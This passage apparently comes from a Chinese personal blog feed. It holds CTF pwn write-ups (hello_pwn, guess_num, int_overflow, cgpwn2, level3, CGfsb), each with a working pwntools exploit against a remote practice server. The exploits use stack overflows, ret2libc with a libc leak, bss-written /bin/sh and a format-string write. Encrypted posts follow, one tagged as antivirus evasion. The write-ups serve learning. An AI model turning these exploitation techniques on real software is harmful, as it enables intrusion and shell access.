class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># @Time    : 2021/7/25 21:16</span></span><br><span class="line"><span class="comment"># @Author  : upload</span></span><br><span class="line"><span class="comment"># @File    : hello_pwn.py</span></span><br><span class="line"><span class="comment"># @Software: PyCharm</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line">content = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">if</span> content == <span class="number">1</span>:</span><br><span class="line">            upload = process(<span class="string">&quot;level&quot;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            upload = remote(<span class="string">&quot;111.200.241.244&quot;</span>, <span class="number">60862</span>)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        print(<span class="string">&quot;The exp is error~&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    payload = (<span class="string">&#x27;a&#x27;</span> * <span class="number">4</span>).encode()</span><br><span class="line">    payload += p64(<span class="number">1853186401</span>)</span><br><span class="line">    upload.recvuntil(<span class="string">&quot;lets get helloworld for bof\n&quot;</span>)</span><br><span class="line">    upload.sendline(payload)</span><br><span class="line"></span><br><span class="line">    upload.interactive()</span><br><span class="line"></span><br><span class="line">main()</span><br></pre></td></tr></table></figure><h1 id="guess-num"><a href="#guess-num" class="headerlink" title="guess_num"></a>guess_num</h1><h2 id="知识点："><a href="#知识点：" class="headerlink" title="知识点："></a>知识点：</h2><p>这个题目全开的!</p><p><img src= "/img/loading.gif" data-lazy-src="https://gitee.com/taochiyu/blogimage/raw/master/img/20210725213738.png" alt="image-20210725213738457"></p><p>程序逻辑很简单！就是<code>gets((__int64)&amp;v8);</code> 可以溢出！ 把种子覆盖掉！ 自己设置种子！ </p><h2 id="exp-3"><a href="#exp-3" class="headerlink" title="exp"></a>exp</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># @Time    : 2021/7/25 21:52</span></span><br><span class="line"><span class="comment"># @Author  : upload</span></span><br><span class="line"><span class="comment"># @File    : guess_num.py</span></span><br><span class="line"><span class="comment"># @Software: PyCharm</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(os=<span class="string">&quot;linux&quot;</span>, arch=<span class="string">&quot;amd64&quot;</span>, log_level=<span class="string">&quot;debug&quot;</span>)</span><br><span class="line">content = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">srand</span>():</span></span><br><span class="line">    lib = cdll.LoadLibrary(<span class="string">&quot;libc.so.6&quot;</span>)</span><br><span class="line">    lib.srand(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">10</span>):</span><br><span class="line">        number = str(lib.rand() % <span class="number">6</span> + <span class="number">1</span>)</span><br><span class="line">        upload.recvuntil(<span class="string">&quot;Please input your guess number:&quot;</span>)</span><br><span class="line">        upload.sendline(number)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line">    <span class="keyword">global</span> upload</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">if</span> content == <span class="number">1</span>:</span><br><span class="line">            upload = process(<span class="string">&quot;guess&quot;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            upload = remote(<span class="string">&quot;111.200.241.244&quot;</span>, <span class="number">63451</span>)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        print(<span class="string">&quot;[!!]The exp is content error~\n&quot;</span>)</span><br><span class="line"></span><br><span class="line">    payload = <span class="string">b&quot;a&quot;</span> * (<span class="number">0x30</span> - <span class="number">0x10</span>)</span><br><span class="line">    payload = payload + p64(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    upload.recvuntil(<span class="string">&quot;Your name:&quot;</span>)</span><br><span class="line">    upload.sendline(payload)</span><br><span class="line"></span><br><span class="line">    srand()</span><br><span class="line">    upload.interactive()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">main()</span><br></pre></td></tr></table></figure><h1 id="int-overflow"><a href="#int-overflow" class="headerlink" title="int_overflow"></a>int_overflow</h1><h2 id="知识点：栈溢出"><a href="#知识点：栈溢出" class="headerlink" title="知识点：栈溢出"></a>知识点：栈溢出</h2><p><img src= "/img/loading.gif" data-lazy-src="https://gitee.com/taochiyu/blogimage/raw/master/img/20210725233659.png" alt="image-20210725233658992"></p><p><code>unsigned __int8 v3;</code> 只取 8个字节！这说明！</p><p>当我们输入261时就可以跳到<code>result = strcpy(&amp;dest, s);</code></p><p><img src= "/img/loading.gif" data-lazy-src="https://gitee.com/taochiyu/blogimage/raw/master/img/20210725234226.png" alt="image-20210725234226819"></p><p><code>溢出点 0x14 +0x04</code></p><p><img src= "/img/loading.gif" data-lazy-src="https://gitee.com/taochiyu/blogimage/raw/master/img/20210725233914.png" alt="image-20210725233914057"></p><h2 id="exp-4"><a href="#exp-4" class="headerlink" title="exp"></a>exp</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># @Time    : 2021/7/25 23:58</span></span><br><span class="line"><span class="comment"># @Author  : upload</span></span><br><span class="line"><span class="comment"># @File    : int_over.py</span></span><br><span class="line"><span class="comment"># @Software: PyCharm</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(os=<span class="string">&quot;linux&quot;</span>, arch=<span class="string">&quot;x86&quot;</span>, log_level=<span class="string">&quot;debug&quot;</span>)</span><br><span class="line">system_addr = <span class="number">0x0804868B</span></span><br><span class="line">content = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">if</span> content == <span class="number">1</span>:</span><br><span class="line">            upload = process(<span class="string">&quot;over&quot;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            upload = remote(<span class="string">&quot;111.200.241.244&quot;</span>, <span class="number">62611</span>)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        print(<span class="string">&quot;[!!]The exp is content error~&quot;</span>)</span><br><span class="line"></span><br><span class="line">    payload = <span class="string">b&quot;a&quot;</span> * (<span class="number">0x14</span> + <span class="number">0x04</span>) + p32(system_addr)</span><br><span class="line">    payload = payload.ljust(<span class="number">261</span>, <span class="string">b&quot;a&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    print(payload)</span><br><span class="line">    upload.sendlineafter(<span class="string">&quot;Your choice:&quot;</span>,<span class="string">&quot;1&quot;</span>)</span><br><span class="line">    upload.sendlineafter(<span class="string">&quot;Please input your username:&quot;</span>,<span class="string">&quot;1&quot;</span>)</span><br><span class="line">    upload.recvuntil(<span class="string">&quot;Please input your passwd:&quot;</span>)</span><br><span class="line">    upload.sendline(payload)</span><br><span class="line"></span><br><span class="line">    upload.interactive()</span><br><span class="line"></span><br><span class="line">main()</span><br></pre></td></tr></table></figure><p>有一点要明白！就是 261压入栈的时候！ 前<code>b&quot;a&quot; * (0x14 + 0x04)</code> 是垃圾数据！ 压到p32(system_addr)就好了！ 这一定我晕晕的！睡觉睡觉睡觉了 !脑壳晕了！😶😶😶😶</p><h1 id="cgpwn2"><a href="#cgpwn2" class="headerlink" title="cgpwn2"></a>cgpwn2</h1><h2 id="知识点：bss段写了"><a href="#知识点：bss段写了" class="headerlink" title="知识点：bss段写了"></a>知识点：bss段写了</h2><p>基础的知识还不是很了解！</p><p><code>_bss</code> 段可以写入！  这里我们自己写入<code>bin/sh</code></p><p><img src= "/img/loading.gif" data-lazy-src="https://gitee.com/taochiyu/blogimage/raw/master/img/20210726205934.png" alt="image-20210726205934733"></p><p>name 那是bss段！我们写入！</p><p>后门gets溢出！ 程序里有system!</p><p>那我们的思路就是 </p><p>get溢出到system! 因为是32位 再加4个字节垃圾数据！然后我们数据/bin/sh 也就是bss段写入/bin/sh</p><p>让system执行/bin/sh</p><h2 id="exp-5"><a href="#exp-5" class="headerlink" title="exp"></a>exp</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># @Time    : 2021/7/26 21:02</span></span><br><span class="line"><span class="comment"># @Author  : upload</span></span><br><span class="line"><span class="comment"># @File    : cgpwn24.py</span></span><br><span class="line"><span class="comment"># @Software: PyCharm</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(os=<span class="string">&quot;linux&quot;</span>, arch=<span class="string">&quot;x86&quot;</span>, log_level=<span class="string">&quot;debug&quot;</span>)</span><br><span class="line">content = <span class="number">0</span></span><br><span class="line">elf = ELF(<span class="string">&quot;cgpwn2&quot;</span>)</span><br><span class="line"></span><br><span class="line">bin_sh = <span class="number">0x0804A080</span>     <span class="comment">#这里是bss位置</span></span><br><span class="line">system = elf.plt[<span class="string">&quot;system&quot;</span>] <span class="comment">#程序system的位置</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">if</span> content == <span class="number">1</span>:</span><br><span class="line">            upload = process(<span class="string">&quot;cgpwn2&quot;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            upload = remote(<span class="string">&quot;111.200.241.244&quot;</span>, <span class="number">57708</span>)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        print(<span class="string">&quot;[!!]The exp is content error~&quot;</span>)</span><br><span class="line"></span><br><span class="line">    payload = <span class="string">b&quot;a&quot;</span> * (<span class="number">0x26</span> + <span class="number">0x04</span>) <span class="comment">#溢出到r</span></span><br><span class="line">    payload = payload + p32(system) <span class="comment">#返回到system</span></span><br><span class="line">    payload = payload + p32(<span class="number">0x04</span>) <span class="comment"># 4个垃圾数据</span></span><br><span class="line">    payload = payload + p32(bin_sh) <span class="comment"># 执行写入bss段的数据</span></span><br><span class="line"></span><br><span class="line">    upload.recvuntil(<span class="string">&quot;please tell me your name\n&quot;</span>)</span><br><span class="line">    upload.sendline(<span class="string">&quot;/bin/sh&quot;</span>)</span><br><span class="line">    upload.recvuntil(<span class="string">&quot;hello,you can leave some message here:\n&quot;</span>)</span><br><span class="line">    upload.sendline(payload)</span><br><span class="line"></span><br><span class="line">    upload.interactive()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">main()</span><br></pre></td></tr></table></figure><h1 id="level3"><a href="#level3" class="headerlink" title="level3"></a>level3</h1><h2 id="知识点：-lic文件泄露"><a href="#知识点：-lic文件泄露" class="headerlink" title="知识点： lic文件泄露"></a>知识点： lic文件泄露</h2><p>libc!libc!这次没有system，你能帮菜鸡解决这个难题么?</p><p><img src= "/img/loading.gif" data-lazy-src="https://gitee.com/taochiyu/blogimage/raw/master/img/20210726213938.png" alt="image-20210726213938445"></p><p>buf是可以溢出的！</p><p>这个题怎么做呢！ 看了讲解！</p><p>我总结一下！</p><p>就是这里的read是溢出点<br>思路方向</p><p>1.泄露write地址，获取与libc偏移量   为什么要偏移量呢！ 这里可以这样理解！就是不同libc里差值是一样的！</p><p>就是 2 - 7  和   5 - 10       2到5是3    7到10也是3  把数字看成函数就行了！</p><p>所以得到函数地址后 - libc里的函数地址就是差值！</p><p>2.得到system和/bin/sh<br>3.pwn<br>我们有write@plt和got</p><p>为什么要找got表里的write 其实我是有点懵的！不知道！以后看见讲解再说！</p><p><img src= "/img/loading.gif" data-lazy-src="https://gitee.com/taochiyu/blogimage/raw/master/img/20210726215710.png" alt="image-20210726215709970"></p><p>粘大佬一张图</p><p><img src= "/img/loading.gif" data-lazy-src="https://gitee.com/taochiyu/blogimage/raw/master/img/20210726220555.png" alt="img"></p><h2 id="exp-6"><a href="#exp-6" class="headerlink" title="exp"></a>exp</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># @Time    : 2021/7/26 21:39</span></span><br><span class="line"><span class="comment"># @Author  : upload</span></span><br><span class="line"><span class="comment"># @File    : level3.py</span></span><br><span class="line"><span class="comment"># @Software: PyCharm</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(os=<span class="string">&quot;linux&quot;</span>, arch=<span class="string">&quot;x86&quot;</span>, log_level=<span class="string">&quot;debug&quot;</span>)</span><br><span class="line">content = <span class="number">1</span></span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&quot;level3&quot;</span>)</span><br><span class="line">lib = ELF(<span class="string">&quot;libc_32.so.6&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># elf文件信息</span></span><br><span class="line">write_plt_addr = elf.plt[<span class="string">&quot;write&quot;</span>]</span><br><span class="line">write_got_addr = elf.got[<span class="string">&quot;write&quot;</span>]</span><br><span class="line">main_addr = elf.symbols[<span class="string">&quot;main&quot;</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># libc文件信息</span></span><br><span class="line">lib_write_addr = lib.symbols[<span class="string">&quot;write&quot;</span>]</span><br><span class="line">lib_system_addr = lib.symbols[<span class="string">&quot;system&quot;</span>]</span><br><span class="line">lib_bin_sh_addr = next(lib.search(<span class="string">b&#x27;/bin/sh&#x27;</span>))<span class="comment">#next打包下</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># print(write_plt_addr,write_got_addr,main_addr)</span></span><br><span class="line"><span class="comment"># print(lib_write_addr,lib_system_addr,lib_bin_sh_addr)</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">if</span> content == <span class="number">1</span>:</span><br><span class="line">            upload = process(<span class="string">&quot;level3&quot;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            upload = remote(<span class="string">&quot;111.200.241.244&quot;</span>, <span class="number">65451</span>)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        print(<span class="string">&quot;[!!] content error~&quot;</span>)</span><br><span class="line"></span><br><span class="line">    payload = <span class="string">b&#x27;a&#x27;</span> * (<span class="number">0x88</span> + <span class="number">0x04</span>)</span><br><span class="line">    payload = payload + p32(write_plt_addr) + p32(main_addr)</span><br><span class="line">    payload = payload + p32(<span class="number">1</span>) + p32(write_got_addr) + p32(<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 泄露信息</span></span><br><span class="line">    upload.sendlineafter(<span class="string">&quot;Input:\n&quot;</span>, payload)</span><br><span class="line">    write_addr = u32(upload.recv()[:<span class="number">4</span>])  <span class="comment">#u32解包</span></span><br><span class="line">    print(<span class="string">&#x27;write_addr:&#x27;</span>, hex(write_addr))</span><br><span class="line"></span><br><span class="line">    <span class="comment"># payload数据</span></span><br><span class="line">    base_addr = write_addr - lib_write_addr</span><br><span class="line">    system_addr = base_addr + lib_system_addr</span><br><span class="line">    bin_sh_addr = base_addr + lib_bin_sh_addr</span><br><span class="line"></span><br><span class="line">    payload = <span class="string">b&#x27;a&#x27;</span> * (<span class="number">0x88</span> + <span class="number">0x04</span>)</span><br><span class="line">    payload = payload + p32(system_addr) + <span class="string">b&#x27;aaaa&#x27;</span> + p32(bin_sh_addr)</span><br><span class="line"></span><br><span class="line">    upload.sendlineafter(<span class="string">&quot;Input:\n&quot;</span>, payload)</span><br><span class="line">    upload.interactive()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">main()</span><br></pre></td></tr></table></figure><h1 id="学习知识点"><a href="#学习知识点" class="headerlink" title="学习知识点"></a>学习知识点</h1><p>先去了解下哪些防护！</p><p><code>https://blog.csdn.net/rchaos/article/details/104344276</code></p><h1 id="CGfsb"><a href="#CGfsb" class="headerlink" title="CGfsb"></a>CGfsb</h1><h2 id="知识点：格式化字符串"><a href="#知识点：格式化字符串" class="headerlink" title="知识点：格式化字符串"></a>知识点：格式化字符串</h2><p>这里有讲解文章！</p><p><code>https://blog.csdn.net/weixin_45556441/article/details/114080930</code></p><p><code>会触发该漏洞的函数很有限，主要就是printf、sprintf、fprintf等print家族函数。</code></p><p><code>(2）如str是format，比如是%2$x，则输出偏移2处的16进制数据0xdeadbeef。</code></p><p><img src= "/img/loading.gif" data-lazy-src="https://gitee.com/taochiyu/blogimage/raw/master/img/20210727235308.png" alt="image-20210727235307837"></p><p>可以看到输出的时候！加了个&amp;  取地址！</p><p><img src= "/img/loading.gif" data-lazy-src="https://gitee.com/taochiyu/blogimage/raw/master/img/20210728212529.png" alt="image-20210728212529459"></p><p>这这个题把！ 我们要知道什么！就是知道偏移量！</p><p>其实我现在不了解知道偏移量有什么用！</p><p>先记住把！ 以后再说！</p><p>哦！对了可以这样了解！ 因为偏移10个位置 又回到它了！ 那那那那那那！</p><p>等我们偏移到他的时候!<code>%10$n</code></p><p>是偏移<code>10$</code>个位置的意思！</p><p>%n就是8 的值就是8！ 因为前面8个字节嘛！</p><p>那它的位置当前值就是8！ 就可以写入成功了！哈哈哈哈哈！这样理解就好了😀😀😀😀</p><h2 id="exp-7"><a href="#exp-7" class="headerlink" title="exp"></a>exp</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># @Time    : 2021/7/28 21:50</span></span><br><span class="line"><span class="comment"># @Author  : upload</span></span><br><span class="line"><span class="comment"># @File    : CGfsb.py</span></span><br><span class="line"><span class="comment"># @Software: PyCharm</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(os=<span class="string">&quot;linux&quot;</span>, arch=<span class="string">&quot;x86&quot;</span>, log_level=<span class="string">&quot;debug&quot;</span>)</span><br><span class="line">content = <span class="number">0</span></span><br><span class="line">pwnme_bss = <span class="number">0x0804A068</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">if</span> content == <span class="number">1</span>:</span><br><span class="line">            upload = process(<span class="string">&quot;CGfsb&quot;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            upload = remote(<span class="string">&quot;111.200.241.244&quot;</span>, <span class="number">52727</span>)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        print(<span class="string">&quot;[!] Content error~&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># addr_payload = &quot;aaaa_%p_%p_%p_%p_%p_%p_%p_%p_%p_%p_%p_%p_%p_%p_%p_%p_%p_%p_%p_%p&quot;</span></span><br><span class="line">    <span class="comment"># upload.sendlineafter(&quot;please tell me your name:\n&quot;, &quot;aaaa&quot;)</span></span><br><span class="line">    <span class="comment"># upload.sendlineafter(&quot;leave your message please:\n&quot;,addr_payload)</span></span><br><span class="line">    <span class="comment"># print(upload.recv())</span></span><br><span class="line"></span><br><span class="line">    payload = p32(pwnme_bss) + <span class="string">b&#x27;aaaa&#x27;</span> + <span class="string">b&quot;%10$n&quot;</span>  <span class="comment"># (代表8  pwnme地址4字节+4字节数据)</span></span><br><span class="line">    upload.sendlineafter(<span class="string">&quot;please tell me your name:\n&quot;</span>, <span class="string">&quot;aaaa&quot;</span>)</span><br><span class="line">    upload.sendlineafter(<span class="string">&quot;leave your message please:\n&quot;</span>, payload)</span><br><span class="line">    upload.interactive()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">main()</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">无聊呀！ 那那那！学会PWN吧！学习嘛！咱想学啥学就学啥！</summary>
    
    
    
    
  </entry>
  
  <entry>
    <title>暑假</title>
    <link href="http://upload.love/2021/07/22/%E6%9A%91%E5%81%87-9/"/>
    <id>http://upload.love/2021/07/22/%E6%9A%91%E5%81%87-9/</id>
    <published>2021-07-22T11:03:47.000Z</published>
    <updated>2021-07-24T02:32:29.446Z</updated>
    
    <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="抱歉, 这个密码看着不太对, 请再试试." data-whm="抱歉, 这个文章不能被校验, 不过您还是能看看解密后的内容.">  <script id="hbeData" type="hbeData" data-hmacdigest="4392b7fa16c04f671671c9b37dc64d88ecd6077a7721ca4ccf49b99aac1f0572"></script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">您好, 这里需要密码.</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
    
    
    <summary type="html">免杀</summary>
    
    
    
    
  </entry>
  
  <entry>
    <title>暑假</title>
    <link href="http://upload.love/2021/07/22/%E6%9A%91%E5%81%87-8/"/>
    <id>http://upload.love/2021/07/22/%E6%9A%91%E5%81%87-8/</id>
    <published>2021-07-22T06:51:14.000Z</published>
    <updated>2021-07-22T10:55:34.086Z</updated>
    
    <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="抱歉, 这个密码看着不太对, 请再试试." data-whm="抱歉, 这个文章不能被校验, 不过您还是能看看解密后的内容.">  <script id="hbeData" type="hbeData" data-hmacdigest="90b76b3db1fa2a43f1af91d29470c3fe8b931f84ca040f725388a3f382368cd5">bd3972b2f1d8b4a8c60dbd643b57ed4097e64c42ee0708c735adcbe51889fd172a8b4e3f62a2b4d418cd5804612cab69bbbb42a06c672b967ccc686eba1354dd32317485f8e83bdaf5fd5557a0a7cea3bbde52911e46fc0abea1a0636751c40c7c9f150a3d6ea9795ce0c54417a5d58440f24f0119a96aaf1facde968e97f0d65d47c5e1973e76b167402c26c25fe66b9a22f15386e2184642f401189f3fcb2373a21418ee0b8a86dfa6a63bfcf86f9a56eecf6cd1428e2a561b8f1b32b3d6a4ae94e4b009213c94e7d1e8b41f1e0d327fb1506005417d96b831b15e647ef888ed6729983c57947dc6ae0302fb4fe2f315f11abe8b5b18038c6e00d8b9257120a0736be9ec325368aa59869d6a13478d3a65cd4e4a58b027831d06935b51572ec8c1918ec0c85c1c0b2a8cd8db37af101abe0ea4b4229d1da3911b0fbcdc7b382f6a4d8794558527cb3ca969dbbb5a25d91ba8b54f62319419b9638521f69b471a580e7a92c32bf56522574cd51e275dd4e466063856ddd4499e5e50931d48dbafcde9c337b56752a209aad81a0fb6dc2b92adaf64137a910ad0f8e4abaed2e204cf6fc80b9e0d6c3777e120af398e9a13cfabcd6c9f1589e0f0a30324d41bfb652ff455e43befed466e70a52014f85a95cc3f49517c41db5e21a9bdda75ebcda480d4ddbe84ad9089f0b80eb4d99d6b35b409df1bccd24e15fff4ab7b3b91171a94e92e0b816293efc5b0d6baf16351b5c42371aca1f32ac970534d34274be8e53d5b379899158d0e84c7e3bbe2ecd428dd19771e8f21f48eb62cd42b1705f75a6a8f7fda621d7805f2aefd488f259366e6245a640130f443b3a1d561342ef5e89eb589b2601c7e64200346c9e3dc12e9915e87c2aff476425aab0855289fb94c659f2beabaaac01ea9ae3ce3ff8078cd9d3e091c855b513c80cf1dc8a8cc3427295e14d67e55f37d248aee34eaa829c551bf69e5aa5271d430498825bbbd340fd2929e22a3cc4048225e646c6ec16d730a66962f7647d473a661684ef0c2264d98775292df450f06c69ff0ee1387d2d3fde107751316683705e8486128a0b1e3b27b1e896b2dd67aeb6a2c16532b9d1c3e5c06eb2a3cd1e56753d8d5816a3209eba9a94e2eb3683061b1d3607f7f4d762cef1a2a0066bd59826beec00bd2452f935394d5d072ec2170a19e4ccf31b57d125fa16e9f63e5e5e55f7667c831aab23e2a5a93ca3e332ddbfe7addb9f9df3b1585282fbf022b8e12bf0785019c9e7d42e4b1aea812c3909d710663a7dfeea6f660c16dd74632922997e51ffa839104e5bc71b69ede4e871fccea4521edd8a929f46b5ba58dd4c88b6b9ce3f6cc1144743b42216ff78f206554cfda1006023ee777b9152abba8ef308492c045d3c5ee6b12e97060aee1bf275690f7d718f492d252ba24483db52d4837c94a9208f7596fc31e276b6a017d171a81920b640f6ef0ee138dcaf25d7c040bb46280c1d53b5e41a2e83d7f4b606f69317b9d144b83816a48eb8a83be629d647334418042c974133e26e203d12f92f71f27c84e1d0d5a0bd8157fa1584fdf727ff255fff9f4617b86b85fbac645497131a365053bbdf92e3b2738e3b666a4113c2c3e9ce8ab972c23444239106085af202eee6315af61da959e5d987474b25d7d4f3bad122ecc5b14cdc91721c0059544a3d93d254ae3348e69224b598b0b3fe00cb384c2204efa07850db3f9a5c9789d3e5d91e3c48e6f04e85084dd0e42e90adf5444a278ec1425087120126ad5ba2a4e0dbea95d68bce2c9639cd2fe5576cc843acbfd57bfc1e080baa4131adf3b3ed62d13ae883d72a67e6ced9bbddc8703eccc4c19e1b4e64455e3b88a355826869a9a2fb597b00a990bb698de536fef0260e2ac4d28dc0db7d877da21ac6943d7a48f74b990fb9cee172894b7a7d286ee7ec6d0e199219b5776b34136ab46800820c1ad1a359b91ac6156f1ceb51caba49505f764fa57f30027e1614f0f2c7cef8c43db66c0071b91c07103eab2a28db146339e7b207d9925237acdf5853251bcaa6180fc261768bb8802402ab35174cd46ef486e5051fd079e74b0ece6f95bbbdfec1aef67a57f129e7974061c11c2d4e94f921c7772ed550a09e656fcf165ea84f42b9f33dcd1f6bba72d05d18b4ae41331b1fcaa0b59b9424389cae5be7f0d7e5245a00216b8749e9541d47d456298aba3362590a26cdee8e8c6277e533040174bc8043b1b3821060331dc39ad039fdda2223314d539975b041c71c3d6c965fa5297db1dfb4c072f575b438e43b6c7a58bb71a7b600ac005af27dffc92fa023af4075eadae687198cf67cc4859545df924cb8ca8f214d02d2ecbc5ccb1f1a39603f7b90ebddd34c2996025524a63bf3612c3b8a147283f2525a3f34c71db7adbce5f1d704f3a92c0a860071a9497d08f2b6534c39df61b024e6005903e4de4df4742dd9ec993732ebcdc8fc59b1a34aac04b56dae50a775034093a1ae9bf400b0d1f76eb01361fadfcedec229e99f26a618e0445ff34576e4f916a7eb783ba33b7b860211c313a91e192f655bbb03d6eb6b746b8b2afa39f1e941d080367b30d2c5e9c238f4a60d31a627dc1f00460e765fdccb492aaa4d7b7ec04a1672ccfb9bd5e00ab0f6e1f0da1c5c038d82c7856b961ec075767d1c2e195332ffb006fab03679eb44405d925080f05c0a2b2a574adc5cc1b2c5fb200b59c66206771481470cb75b5c469c6b6848249d6be674e80251045fa69d47b62dfcc95c81edd890940d7747e176afcad46191f4a9ad5592f511386e2fa724e1025da588c736476e152585942549a0acb96f1f0508d1ba8f78b9f54794c0dcc9b1043e6ff5ce89a0c31c0761d35839b561d4da1d0e22c07b35800eefd127ee42673b39fda7cd7e0be2e50f8e580d993dd405e82d9d611ba545e9948612fc1eb7c5014c67966264fb9c41c639d0109b3b4b1ea9f502cd6802486e40c918bb36311aa22d19daf38f7c4d8e34408f2b266e1eb05b5507c5911b6779134d90bce77ada495233f14ba6a92c178e37ee99ff69a401fb24aa67239f876b5f5f1fb4df2376c11bbe33e85d1fadb0f7d68a60092ca5fc894a9b19f439fb716a4ccf1c48b17cb03849d196b907a36da8392287c4000de632b9510abcaf09a149e43d2d390ee48e1ee65913efefc16a99c80bc29a4b14970b86268c7a535d839dbd90d67e3a147afda0a33be0305f454aa65278212713c0b0cc1876aa304fb283ceb60eb44c913f21777fae9d31a853586d99ed93cc48ba4be3d83947c2f670a890231cb7eb255ac577bbf32056debf8f87abd983d26a12d195ab3dc0813422747cdaa5c9d002d6ac72cd4ef11b0b7de257d3acf4a0371a28d78848a0962f4be6e402c859439b127b13dbc904cb100859e7a3ad0e6cb8e04fddc4e2200e58d106d7ead82008ca853d0c1e70b06366c376118e2a4a976f21ff393cf46db9ac254303aa1c1c189adde38a37516841315d6311278f67df6019928f85486cbb4d14c8fdfb1b7d6089400e64fbc047ff65576aff001058d36aa478cf2885e3206d1733c4efb8080c80574dec505bd700f5383235e719b746596755b2c4b28a5742d5b6f9130037c187cd425ffbc0ef33bc8bb2ec2570b7fbd29bb14607bceed566a80d73b9512c430cf74f3a2b731f671557b65667e2c7905d373f78244ba989dbfabc6f54758cab29d825c10c634c284052799d2